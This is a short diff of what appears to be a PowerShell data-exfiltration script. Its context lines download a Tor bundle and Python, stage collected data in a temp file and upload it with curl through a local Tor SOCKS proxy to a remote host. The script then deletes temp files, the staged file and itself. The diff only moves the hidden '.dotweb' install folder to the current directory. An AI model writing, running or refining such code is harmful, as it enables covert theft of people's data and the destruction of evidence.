@@ -4,7 +4,7 @@ param (
 $torURI = "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.9/tor-expert-bundle-windows-x86_64-14.0.9.tar.gz"
 $pythonURI = "https://www.python.org/ftp/python/3.13.3/python-3.13.3.exe"
 $downloadPath = "$env:TEMP"
-$installPath = Join-Path $PSScriptRoot '.dotweb'
+$installPath = Join-Path $PWD '.dotweb'
 New-Item -ItemType Directory -Path $installPath -Force *>$null
 $exfileName = "tmp.txt"
 $exfile = $downloadPath+"\"+$exfileName 
@@ -129,3 +129,4 @@ cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$r
 Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $exfile -Force
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
+
